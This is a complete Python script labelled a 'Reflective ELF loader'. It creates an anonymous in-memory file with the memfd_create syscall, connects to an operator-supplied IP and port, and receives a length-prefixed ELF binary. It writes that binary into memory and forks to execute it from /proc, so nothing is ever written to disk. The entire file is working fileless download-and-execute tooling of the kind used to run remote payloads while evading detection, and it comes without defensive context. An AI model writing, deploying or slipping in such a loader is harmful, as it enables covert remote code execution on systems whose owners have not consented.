import ctypes
import socket
import os
import struct
import argparse

# Constants
SYS_memfd_create = 319  # x86_64 syscall number
MFD_CLOEXEC = 0x0001
BUF_SIZE = 1024

# Define memfd_create syscall
libc = ctypes.CDLL(None)
syscall = libc.syscall
syscall.restype = ctypes.c_int

def memfd_create(name: str, flags: int) -> int:
    name_bytes = name.encode('utf-8')
    return syscall(SYS_memfd_create, ctypes.c_char_p(name_bytes), ctypes.c_uint(flags))

def recv_elf(ip, port):
    s = socket.create_connection((ip, port))
    size_data = s.recv(4)
    elf_size = struct.unpack('<I', size_data)[0]

    elf_data = b''
    while len(elf_data) < elf_size:
        chunk = s.recv(min(4096, elf_size - len(elf_data)))
        if not chunk:
            raise ConnectionError("Socket closed before full ELF received")
        elf_data += chunk

    s.close()
    return elf_data

def write_to_fd(fd, data):
    bytes_written = 0
    while bytes_written < len(data):
        written = os.write(fd, data[bytes_written:])
        if written <= 0:
            raise RuntimeError("Failed to write to memfd")
        bytes_written += written

def main():

    parser = argparse.ArgumentParser(description="Reflective ELF loader")
    parser.add_argument("-i","--ip", help="IP address of sender", required=True)
    parser.add_argument("-p","--port", type=int, help="Port to connect to", required=True)
    args = parser.parse_args()

    # Step 1: Create memfd
    fd = memfd_create("mfd_execve", MFD_CLOEXEC)
    if fd < 0:
        raise OSError("memfd_create failed")

    # Step 2: Receive ELF binary
    elf_data = recv_elf(args.ip, args.port)

    # Step 3: Write ELF to memfd
    write_to_fd(fd, elf_data)

    # Step 4: Fork and execve from /proc/self/fd/<fd>
    path = f"/proc/{os.getpid()}/fd/{fd}"
    pid = os.fork()
    if pid == 0:
        os.execve(path, [path], os.environ.copy())

if __name__ == '__main__':
    main()
